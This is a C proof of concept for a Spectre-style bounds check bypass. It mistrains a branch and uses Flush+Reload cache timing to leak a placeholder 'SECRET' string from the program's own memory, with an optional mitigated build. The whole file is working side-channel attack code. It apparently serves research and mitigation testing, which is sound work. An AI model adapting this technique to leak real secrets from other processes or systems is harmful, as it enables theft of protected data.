#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifdef SECURE
#include "../context-light.h"
#endif

size_t CACHE_MISS = 0;
#include "cacheutils.h"

// accessible data
#define DATA "data|"

// inaccessible secret (following accessible data)
#define SECRET "SECRET"

#define DATA_SECRET DATA SECRET

#ifdef SECURE
unsigned char nospec data[128];
#else
unsigned char data[128];
#endif

char *mem;

unsigned char throttle[8 * 4096];

size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;
  uint64_t start = 0, end = 0;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    reload_time += (end - start);
  }
  for (i = 0; i < count; i++) {
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    flush_reload_time += (end - start);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

void access_array(int x) {
  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  mfence();
  flush(&len);
  flush(&x);
  for (int i = 0; i < 8; i++) {
    flush(throttle + i * 4096);
  }

  // ensure data is flushed at this point
  mfence();

  if ((float)x / (float)len < 1) {
    maccess(mem + data[x] * 4096);
  }
}

int main(int argc, const char **argv) {
  if (!CACHE_MISS) CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  char *_mem = malloc(4096 * (256 + 4));
  // page aligned
  mem = (char *)(((size_t)_mem & ~0xfff) + 4096 * 2);
  // initialize memory
  memset(mem, 0, 4096 * 256);

  // store secret
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // flush everything
  int i, j = 0, k;
  for (j = 0; j < 256; j++) {
    flush(mem + j * 4096);
  }
  for (j = 0; j < 8; j++) {
    throttle[j * 4096] = 1;
  }

  // nothing leaked so far
  char leaked[sizeof(DATA_SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(DATA_SECRET)] = 0;

  j = 0;
  while (1) {
    // for every byte in the string
    j = (j + 1) % sizeof(DATA_SECRET);

    // mistrain with valid index
    for (int y = 0; y < 10; y++) {
      access_array(0);
    }
    // potential out-of-bounds access
    access_array(j);

    // only show inaccessible values (SECRET)
    if (j >= sizeof(DATA) - 1) {
      mfence(); // avoid speculation
      for (i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
        if (flush_reload(mem + mix_i * 4096)) {
          if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[j] == ' ') {
            leaked[j] = mix_i;
            printf("\x1b[33m%s\x1b[0m\r", leaked);
          }
          fflush(stdout);
          sched_yield();
        }
      }
    }

    if (!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1)) break;

    sched_yield();
  }
  printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");

  return (0);
}
